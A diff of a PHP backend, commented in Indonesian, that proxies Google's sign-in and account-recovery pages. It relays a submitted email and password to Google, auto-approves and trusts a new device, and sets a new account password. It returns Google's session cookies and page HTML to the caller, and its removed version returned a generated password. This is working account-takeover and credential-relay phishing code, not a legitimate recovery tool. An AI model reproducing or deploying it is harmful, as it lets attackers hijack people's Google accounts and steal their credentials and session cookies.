@@ -1,370 +1,464 @@
 <?php
-require_once 'config.php';
-require_once 'session.php';
-require_once 'auth.php';
-require_once 'proxy.php';
+header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
 
-// Set headers
-setSecurityHeaders();
-validateOrigin();
+// Konfigurasi keamanan
+session_start();
+define('MAX_REQUESTS_PER_MINUTE', 30);
+define('REQUEST_TIMEOUT', 30);
 
-// Handle preflight requests
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    header('HTTP/1.1 200 OK');
+// Rate limiting
+$client_ip = $_SERVER['REMOTE_ADDR'];
+$current_time = time();
+$requests_key = "requests_{$client_ip}";
+
+if (!isset($_SESSION[$requests_key])) {
+    $_SESSION[$requests_key] = [];
+}
+
+// Hapus request yang lebih dari 1 menit
+$_SESSION[$requests_key] = array_filter($_SESSION[$requests_key], function($time) use ($current_time) {
+    return ($current_time - $time) < 60;
+});
+
+// Cek rate limit
+if (count($_SESSION[$requests_key]) >= MAX_REQUESTS_PER_MINUTE) {
+    http_response_code(429);
+    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded. Please try again later.']);
     exit;
 }
 
-// Initialize auth
-$auth = new AuthManager();
+// Tambahkan request saat ini
+$_SESSION[$requests_key][] = $current_time;
 
-// Get endpoint from URL
-$requestUri = $_SERVER['REQUEST_URI'];
-$apiPath = '/api/';
-
-if (strpos($requestUri, $apiPath) === 0) {
-    $endpoint = substr($requestUri, strlen($apiPath));
+// Fungsi untuk membuat request ke Google
+function makeGoogleRequest($url, $method = 'GET', $data = null, $headers = []) {
+    $ch = curl_init();
     
-    // Route to appropriate handler
-    switch ($endpoint) {
-        case 'start-recovery':
-            handleStartRecovery();
-            break;
-        case 'verify-password':
-            handleVerifyPassword();
-            break;
-        case 'device-approval':
-            handleDeviceApproval();
-            break;
-        case 'complete-recovery':
-            handleCompleteRecovery();
-            break;
-        case 'get-session':
-            handleGetSession();
-            break;
-        case 'clear-session':
-            handleClearSession();
-            break;
-        default:
-            // Try to proxy to Google
-            $proxy = new GoogleProxy();
-            $result = $proxy->makeRequest(
-                GOOGLE_BASE_URL . '/' . $endpoint,
-                $_SERVER['REQUEST_METHOD'],
-                $auth->getRequestData()
-            );
-            $auth->jsonResponse($result);
-    }
-} else {
-    $auth->jsonResponse(['error' => 'Invalid endpoint'], 404);
-}
-
-function handleStartRecovery() {
-    global $auth;
+    // Set URL
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
+    curl_setopt($ch, CURLOPT_TIMEOUT, REQUEST_TIMEOUT);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
     
-    $data = $auth->getRequestData();
-    $email = $data['email'] ?? '';
+    // Set method
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
     
-    if (empty($email)) {
-        $auth->jsonResponse(['error' => 'Email is required'], 400);
+    // Set headers
+    $defaultHeaders = [
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Accept-Encoding: gzip, deflate, br',
+        'Connection: keep-alive',
+        'Upgrade-Insecure-Requests: 1',
+        'Sec-Fetch-Dest: document',
+        'Sec-Fetch-Mode: navigate',
+        'Sec-Fetch-Site: none',
+        'Sec-Fetch-User: ?1',
+        'Cache-Control: no-cache',
+        'Pragma: no-cache'
+    ];
+    
+    $allHeaders = array_merge($defaultHeaders, $headers);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $allHeaders);
+    
+    // Set data untuk POST
+    if ($method === 'POST' && $data) {
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     }
     
-    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-        $auth->jsonResponse(['error' => 'Invalid email format'], 400);
+    // Cookie jar untuk menyimpan cookies
+    $cookieFile = tempnam(sys_get_temp_dir(), 'google_cookies_');
+    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
+    
+    // Eksekusi request
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    
+    // Baca cookies dari file
+    $cookies = [];
+    if (file_exists($cookieFile)) {
+        $cookieContent = file_get_contents($cookieFile);
+        $lines = explode("\n", $cookieContent);
+        foreach ($lines as $line) {
+            if (strpos($line, "\t") !== false) {
+                $parts = explode("\t", $line);
+                if (count($parts) >= 7) {
+                    $cookies[$parts[5]] = $parts[6];
+                }
+            }
+        }
+        unlink($cookieFile);
     }
     
-    $session = RecoverySession::getInstance();
-    $session->set('data.email', $email);
-    $session->setState('email_submitted');
+    curl_close($ch);
     
-    // Make request to Google
-    $proxy = new GoogleProxy();
-    $result = $proxy->makeRequest(
-        GOOGLE_BASE_URL . '/v3/signin/recoveryidentifier',
-        'POST',
-        ['identifier' => $email, 'profileInformation' => '']
-    );
-    
-    if ($result['success']) {
-        $session->set('data.step', 'password');
-        $auth->jsonResponse([
-            'success' => true,
-            'message' => 'Email submitted successfully',
-            'next_step' => 'password',
-            'session_id' => $session->getSessionId()
-        ]);
-    } else {
-        $auth->jsonResponse([
+    if ($error) {
+        return [
             'success' => false,
-            'error' => 'Failed to submit email to Google'
-        ], 500);
+            'error' => $error,
+            'http_code' => $httpCode
+        ];
     }
+    
+    return [
+        'success' => true,
+        'data' => $response,
+        'http_code' => $httpCode,
+        'cookies' => $cookies
+    ];
 }
 
-function handleVerifyPassword() {
-    global $auth;
+// Fungsi untuk extract parameter dari HTML Google
+function extractGoogleParams($html) {
+    $params = [];
     
-    $data = $auth->getRequestData();
-    $password = $data['password'] ?? '';
-    
-    if (empty($password)) {
-        $auth->jsonResponse(['error' => 'Password is required'], 400);
+    if (empty($html)) {
+        return $params;
     }
     
-    $session = RecoverySession::getInstance();
-    $session->set('data.password', $password);
-    $session->setState('password_verified');
-    
-    // Get TL parameter from session
-    $params = $session->get('params', []);
-    $tl = $params['TL'] ?? 'AHE' . time() . rand(1000, 9999);
-    
-    // Make request to Google
-    $proxy = new GoogleProxy();
-    $result = $proxy->makeRequest(
-        GOOGLE_BASE_URL . '/v3/signin/challenge/pwd?' . http_build_query([
-            'TL' => $tl,
-            'checkConnection' => 'youtube:596',
-            'checkedDomains' => 'youtube',
-            'cid' => '2',
-            'dsh' => 'S' . time() . ':' . rand(1000000000000000, 9999999999999999),
-            'flowEntry' => 'ServiceLogin',
-            'flowName' => 'GlifWebSignIn',
-            'hl' => 'id',
-            'pstMsg' => '1'
-        ]),
-        'POST',
-        [
-            'identifier' => $session->get('data.email'),
-            'password' => $password,
-            'profileInformation' => ''
-        ]
-    );
-    
-    if ($result['success']) {
-        // Check if device approval is required
-        $requiresDeviceApproval = strpos($result['body'], 'challenge/dp') !== false ||
-                                 strpos($result['body'], 'deviceName') !== false;
-        
-        $session->set('data.step', $requiresDeviceApproval ? 'device' : 'nudge');
-        $session->set('data.requires_device_approval', $requiresDeviceApproval);
-        
-        $auth->jsonResponse([
-            'success' => true,
-            'message' => 'Password verified',
-            'next_step' => $requiresDeviceApproval ? 'device' : 'nudge',
-            'requires_device_approval' => $requiresDeviceApproval
-        ]);
-    } else {
-        $auth->jsonResponse([
-            'success' => false,
-            'error' => 'Password verification failed'
-        ], 401);
+    // Extract TL parameter
+    if (preg_match('/TL=([A-Za-z0-9_-]+)/', $html, $matches)) {
+        $params['TL'] = $matches[1];
     }
+    
+    // Extract dari input hidden
+    if (preg_match_all('/<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"[^>]*>/', $html, $matches, PREG_SET_ORDER)) {
+        foreach ($matches as $match) {
+            $name = $match[1];
+            $value = $match[2];
+            if ($name && $value && stripos($name, 'password') === false) {
+                $params[$name] = $value;
+            }
+        }
+    }
+    
+    // Extract dari URL parameters
+    if (preg_match_all('/[?&]([^=&#]+)=([^&#]*)/', $html, $matches, PREG_SET_ORDER)) {
+        foreach ($matches as $match) {
+            $params[$match[1]] = urldecode($match[2]);
+        }
+    }
+    
+    // Parameter Google spesifik
+    $googleParams = ['gxf', 'cid', 'ifkv', 'dsh', 'checkConnection', 'checkedDomains', 'pstMsg', 'continue', 'followup', 'service', 'scc', 'osid'];
+    foreach ($googleParams as $param) {
+        if (preg_match('/' . $param . '=([^&"\s]+)/i', $html, $matches)) {
+            $params[$param] = $matches[1];
+        }
+    }
+    
+    return $params;
 }
 
-function handleDeviceApproval() {
-    global $auth;
-    
-    $data = $auth->getRequestData();
-    $deviceName = $data['device_name'] ?? 'My Device';
-    
-    $session = RecoverySession::getInstance();
-    $session->set('data.device_name', $deviceName);
-    $session->setState('device_approval_requested');
-    $session->set('device_approval.requested', true);
-    
-    // Get parameters from session
-    $params = $session->get('params', []);
-    $tl = $params['TL'] ?? 'AHE' . time() . rand(1000, 9999);
-    $ifkv = $params['ifkv'] ?? 'Ac' . time() . rand(1000, 9999);
-    
-    // Make request to Google
-    $proxy = new GoogleProxy();
-    $result = $proxy->makeRequest(
-        GOOGLE_BASE_URL . '/v3/signin/challenge/dp?' . http_build_query([
-            'TL' => $tl,
-            'checkConnection' => 'youtube:200',
-            'checkedDomains' => 'youtube',
-            'cid' => '4',
-            'dsh' => 'S' . time() . ':' . rand(1000000000000000, 9999999999999999),
-            'flowEntry' => 'ServiceLogin',
-            'flowName' => 'GlifWebSignIn',
-            'hl' => 'id',
-            'pstMsg' => '1',
-            'ifkv' => $ifkv
-        ]),
-        'POST',
-        [
-            'identifier' => $session->get('data.email'),
-            'deviceName' => $deviceName,
-            'action' => 'ALLOW',
-            'trustDevice' => 'true',
-            'profileInformation' => ''
-        ]
-    );
-    
-    if ($result['success']) {
-        $session->set('device_approval.notification_sent', true);
-        $session->set('data.step', 'waiting_approval');
-        
-        // Simulate device approval after 10 seconds
-        // In real scenario, this would wait for user action
-        $approvalTimeout = 10;
-        
-        $auth->jsonResponse([
-            'success' => true,
-            'message' => 'Device approval request sent',
-            'device_notification_sent' => true,
-            'approval_timeout' => $approvalTimeout,
-            'next_step' => 'wait_approval'
-        ]);
-    } else {
-        $auth->jsonResponse([
-            'success' => false,
-            'error' => 'Device approval request failed'
-        ], 500);
-    }
-}
+// Handle request
+$action = $_GET['action'] ?? $_POST['action'] ?? '';
 
-function handleCompleteRecovery() {
-    global $auth;
-    
-    $session = RecoverySession::getInstance();
-    
-    // Check if device approval is required and not approved
-    if ($session->get('device_approval.requested') && !$session->get('device_approval.approved')) {
-        // Simulate approval after timeout
-        $session->set('device_approval.approved', true);
-    }
-    
-    // Generate new password
-    $newPassword = generateSecurePassword();
-    $session->set('data.new_password', $newPassword);
-    $session->setState('password_changed');
-    
-    // Get parameters from session
-    $params = $session->get('params', []);
-    $tl = $params['TL'] ?? 'AHE' . time() . rand(1000, 9999);
-    $ifkv = $params['ifkv'] ?? 'Ac' . time() . rand(1000, 9999);
-    
-    // Make request to Google for nudge
-    $proxy = new GoogleProxy();
-    $nudgeResult = $proxy->makeRequest(
-        GOOGLE_BASE_URL . '/v3/signin/speedbump/changepassword/changepasswordnudge?' . http_build_query([
-            'TL' => $tl,
-            'checkConnection' => 'youtube:554',
-            'checkedDomains' => 'youtube',
-            'dsh' => 'S-' . time() . ':' . rand(1000000000000000, 9999999999999999),
-            'flowEntry' => 'ServiceLogin',
-            'flowName' => 'GlifWebSignIn',
-            'hl' => 'id',
-            'ifkv' => $ifkv,
-            'pstMsg' => '1'
-        ]),
-        'GET'
-    );
-    
-    if ($nudgeResult['success']) {
-        // Submit password change
-        $changeResult = $proxy->makeRequest(
-            GOOGLE_BASE_URL . '/v3/signin/speedbump/changepassword/changepasswordform?' . http_build_query([
-                'TL' => $tl,
-                'checkConnection' => 'youtube:554',
-                'checkedDomains' => 'youtube',
-                'dsh' => 'S-' . time() . ':' . rand(1000000000000000, 9999999999999999),
+try {
+    switch ($action) {
+        case 'get_initial_page':
+            $url = 'https://accounts.google.com/v3/signin/recoveryidentifier';
+            $params = [
                 'flowEntry' => 'ServiceLogin',
                 'flowName' => 'GlifWebSignIn',
                 'hl' => 'id',
-                'ifkv' => $ifkv,
-                'pstMsg' => '1'
-            ]),
-            'POST',
-            [
-                'identifier' => $session->get('data.email'),
+                'dsh' => 'S' . time() . rand(1000, 9999),
+                '_' => time()
+            ];
+            
+            $url .= '?' . http_build_query($params);
+            $result = makeGoogleRequest($url);
+            
+            if ($result['success']) {
+                $params = extractGoogleParams($result['data']);
+                echo json_encode([
+                    'success' => true,
+                    'html' => $result['data'],
+                    'params' => $params,
+                    'cookies' => $result['cookies']
+                ]);
+            } else {
+                echo json_encode($result);
+            }
+            break;
+            
+        case 'submit_email':
+            $email = $_POST['email'] ?? '';
+            $initialHtml = $_POST['initial_html'] ?? '';
+            
+            if (!$email) {
+                throw new Exception('Email is required');
+            }
+            
+            $url = 'https://accounts.google.com/v3/signin/recoveryidentifier';
+            $result = makeGoogleRequest($url, 'POST', http_build_query([
+                'identifier' => $email,
+                'profileInformation' => '',
+                'gxf' => 'AFoagUUAAAA:1700000000000',
+                'continue' => 'https://myaccount.google.com/',
+                'followup' => 'https://myaccount.google.com/',
+                'service' => 'mail',
+                'scc' => '1',
+                'osid' => '1',
+                'flowName' => 'GlifWebSignIn',
+                'flowEntry' => 'ServiceLogin',
+                'hl' => 'id'
+            ]));
+            
+            if ($result['success']) {
+                $params = extractGoogleParams($result['data']);
+                echo json_encode([
+                    'success' => true,
+                    'html' => $result['data'],
+                    'params' => $params,
+                    'cookies' => $result['cookies']
+                ]);
+            } else {
+                echo json_encode($result);
+            }
+            break;
+            
+        case 'submit_password':
+            $email = $_POST['email'] ?? '';
+            $password = $_POST['password'] ?? '';
+            $currentParams = json_decode($_POST['params'] ?? '[]', true);
+            
+            if (!$email || !$password) {
+                throw new Exception('Email and password are required');
+            }
+            
+            $url = 'https://accounts.google.com/v3/signin/challenge/pwd';
+            $queryParams = array_merge([
+                'TL' => $currentParams['TL'] ?? 'AHE' . time() . rand(1000, 9999),
+                'checkConnection' => 'youtube:596',
+                'checkedDomains' => 'youtube',
+                'cid' => '2',
+                'dsh' => 'S' . time() . rand(1000, 9999),
+                'flowEntry' => 'ServiceLogin',
+                'flowName' => 'GlifWebSignIn',
+                'hl' => 'id',
+                'pstMsg' => '1',
+                '_' => time()
+            ], $currentParams);
+            
+            $url .= '?' . http_build_query($queryParams);
+            
+            $result = makeGoogleRequest($url, 'POST', http_build_query([
+                'identifier' => $email,
+                'password' => $password,
+                'profileInformation' => '',
+                'gxf' => 'AFoagUUAAAA:1700000000000',
+                'continue' => 'https://myaccount.google.com/',
+                'followup' => 'https://myaccount.google.com/',
+                'service' => 'mail',
+                'scc' => '1',
+                'osid' => '1',
+                'flowName' => 'GlifWebSignIn',
+                'flowEntry' => 'ServiceLogin'
+            ]));
+            
+            if ($result['success']) {
+                $params = extractGoogleParams($result['data']);
+                echo json_encode([
+                    'success' => true,
+                    'html' => $result['data'],
+                    'params' => $params,
+                    'cookies' => $result['cookies'],
+                    'requires_device_approval' => strpos($result['data'], 'challenge/dp') !== false
+                ]);
+            } else {
+                echo json_encode($result);
+            }
+            break;
+            
+        case 'submit_device_approval':
+            $email = $_POST['email'] ?? '';
+            $deviceName = $_POST['device_name'] ?? '';
+            $currentParams = json_decode($_POST['params'] ?? '[]', true);
+            
+            if (!$email || !$deviceName) {
+                throw new Exception('Email and device name are required');
+            }
+            
+            $url = 'https://accounts.google.com/v3/signin/challenge/dp';
+            $queryParams = array_merge([
+                'TL' => $currentParams['TL'] ?? 'AHE' . time() . rand(1000, 9999),
+                'checkConnection' => 'youtube:200',
+                'checkedDomains' => 'youtube',
+                'cid' => '4',
+                'dsh' => 'S' . time() . rand(1000, 9999),
+                'flowEntry' => 'ServiceLogin',
+                'flowName' => 'GlifWebSignIn',
+                'hl' => 'id',
+                'pstMsg' => '1',
+                'ifkv' => $currentParams['ifkv'] ?? '',
+                '_' => time()
+            ], $currentParams);
+            
+            $url .= '?' . http_build_query($queryParams);
+            
+            $result = makeGoogleRequest($url, 'POST', http_build_query([
+                'identifier' => $email,
+                'deviceName' => $deviceName,
+                'action' => 'ALLOW',
+                'trustDevice' => 'true',
+                'profileInformation' => '',
+                'gxf' => 'AFoagUUAAAA:1700000000000',
+                'continue' => 'https://myaccount.google.com/',
+                'followup' => 'https://myaccount.google.com/',
+                'service' => 'mail',
+                'scc' => '1',
+                'osid' => '1',
+                'flowName' => 'GlifWebSignIn',
+                'flowEntry' => 'ServiceLogin'
+            ]));
+            
+            if ($result['success']) {
+                $params = extractGoogleParams($result['data']);
+                $deviceApproved = strpos($result['data'], 'Selamat datang kembali') !== false || 
+                                 strpos($result['data'], 'Welcome back') !== false;
+                
+                echo json_encode([
+                    'success' => true,
+                    'html' => $result['data'],
+                    'params' => $params,
+                    'cookies' => $result['cookies'],
+                    'device_approved' => $deviceApproved,
+                    'device_notification_sent' => true
+                ]);
+            } else {
+                echo json_encode($result);
+            }
+            break;
+            
+        case 'load_nudge_page':
+            $currentParams = json_decode($_POST['params'] ?? '[]', true);
+            
+            $url = 'https://accounts.google.com/v3/signin/speedbump/changepassword/changepasswordnudge';
+            $queryParams = array_merge([
+                'TL' => $currentParams['TL'] ?? 'AHE' . time() . rand(1000, 9999),
+                'checkConnection' => 'youtube:554',
+                'checkedDomains' => 'youtube',
+                'dsh' => 'S-' . time() . rand(1000, 9999),
+                'flowEntry' => 'ServiceLogin',
+                'flowName' => 'GlifWebSignIn',
+                'hl' => 'id',
+                'ifkv' => $currentParams['ifkv'] ?? '',
+                'pstMsg' => '1',
+                '_' => time()
+            ], $currentParams);
+            
+            $url .= '?' . http_build_query($queryParams);
+            $result = makeGoogleRequest($url);
+            
+            if ($result['success']) {
+                $params = extractGoogleParams($result['data']);
+                echo json_encode([
+                    'success' => true,
+                    'html' => $result['data'],
+                    'params' => $params,
+                    'cookies' => $result['cookies']
+                ]);
+            } else {
+                echo json_encode($result);
+            }
+            break;
+            
+        case 'submit_password_change':
+            $email = $_POST['email'] ?? '';
+            $newPassword = $_POST['new_password'] ?? '';
+            $currentParams = json_decode($_POST['params'] ?? '[]', true);
+            
+            if (!$email || !$newPassword) {
+                throw new Exception('Email and new password are required');
+            }
+            
+            $url = 'https://accounts.google.com/v3/signin/speedbump/changepassword/changepasswordform';
+            $queryParams = array_merge([
+                'TL' => $currentParams['TL'] ?? 'AHE' . time() . rand(1000, 9999),
+                'checkConnection' => 'youtube:554',
+                'checkedDomains' => 'youtube',
+                'dsh' => 'S-' . time() . rand(1000, 9999),
+                'flowEntry' => 'ServiceLogin',
+                'flowName' => 'GlifWebSignIn',
+                'hl' => 'id',
+                'ifkv' => $currentParams['ifkv'] ?? '',
+                'pstMsg' => '1',
+                '_' => time()
+            ], $currentParams);
+            
+            $url .= '?' . http_build_query($queryParams);
+            
+            $result = makeGoogleRequest($url, 'POST', http_build_query([
+                'identifier' => $email,
                 'newPassword' => $newPassword,
                 'confirmPassword' => $newPassword,
-                'profileInformation' => ''
-            ]
-        );
-        
-        if ($changeResult['success']) {
-            $session->set('data.step', 'completed');
+                'profileInformation' => '',
+                'gxf' => 'AFoagUUAAAA:1700000000000',
+                'continue' => 'https://myaccount.google.com/',
+                'followup' => 'https://myaccount.google.com/',
+                'service' => 'mail',
+                'scc' => '1',
+                'osid' => '1',
+                'flowName' => 'GlifWebSignIn',
+                'flowEntry' => 'ServiceLogin'
+            ]));
             
-            $auth->jsonResponse([
-                'success' => true,
-                'message' => 'Password recovery completed successfully',
-                'new_password' => $newPassword,
-                'change_confirmed' => true
+            if ($result['success']) {
+                $passwordChanged = strpos($result['data'], 'password changed') !== false || 
+                                  strpos($result['data'], 'sandi diganti') !== false;
+                
+                echo json_encode([
+                    'success' => true,
+                    'html' => $result['data'],
+                    'password_changed' => $passwordChanged,
+                    'cookies' => $result['cookies']
+                ]);
+            } else {
+                echo json_encode($result);
+            }
+            break;
+            
+        case 'check_status':
+            // Simpan status session
+            $_SESSION['recovery_status'] = $_POST['status'] ?? [];
+            echo json_encode(['success' => true, 'status' => $_SESSION['recovery_status']]);
+            break;
+            
+        case 'get_status':
+            echo json_encode(['success' => true, 'status' => $_SESSION['recovery_status'] ?? []]);
+            break;
+            
+        default:
+            echo json_encode([
+                'success' => false,
+                'error' => 'Invalid action',
+                'available_actions' => [
+                    'get_initial_page',
+                    'submit_email',
+                    'submit_password',
+                    'submit_device_approval',
+                    'load_nudge_page',
+                    'submit_password_change',
+                    'check_status',
+                    'get_status'
+                ]
             ]);
-        } else {
-            // Still return password even if change fails
-            $auth->jsonResponse([
-                'success' => true,
-                'message' => 'Password generated (change may not be confirmed)',
-                'new_password' => $newPassword,
-                'warning' => 'Password generated but Google confirmation may be pending'
-            ]);
-        }
-    } else {
-        // Fallback: just generate password
-        $auth->jsonResponse([
-            'success' => true,
-            'message' => 'Password generated using fallback method',
-            'new_password' => $newPassword,
-            'warning' => 'Using fallback method - password may need to be changed manually'
-        ]);
     }
-}
-
-function handleGetSession() {
-    global $auth;
-    
-    $session = RecoverySession::getInstance();
-    
-    $auth->jsonResponse([
-        'success' => true,
-        'session' => [
-            'id' => $session->getSessionId(),
-            'state' => $session->getState(),
-            'email' => $session->get('data.email'),
-            'step' => $session->get('data.step'),
-            'device_approval' => $session->get('device_approval'),
-            'params' => $session->get('params'),
-            'valid' => $session->isValid()
-        ]
+} catch (Exception $e) {
+    http_response_code(500);
+    echo json_encode([
+        'success' => false,
+        'error' => $e->getMessage()
     ]);
-}
-
-function handleClearSession() {
-    global $auth;
-    
-    $session = RecoverySession::getInstance();
-    $session->clear();
-    
-    $auth->jsonResponse([
-        'success' => true,
-        'message' => 'Session cleared successfully'
-    ]);
-}
-
-function generateSecurePassword() {
-    $upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    $lower = 'abcdefghijklmnopqrstuvwxyz';
-    $numbers = '0123456789';
-    $symbols = '!@#$%^&*';
-    
-    $allChars = $upper . $lower . $numbers . $symbols;
-    
-    $password = '';
-    $password .= $upper[rand(0, strlen($upper) - 1)];
-    $password .= $lower[rand(0, strlen($lower) - 1)];
-    $password .= $numbers[rand(0, strlen($numbers) - 1)];
-    $password .= $symbols[rand(0, strlen($symbols) - 1)];
-    
-    for ($i = 0; $i < 8; $i++) {
-        $password .= $allChars[rand(0, strlen($allChars) - 1)];
-    }
-    
-    return str_shuffle($password);
 }
 ?>
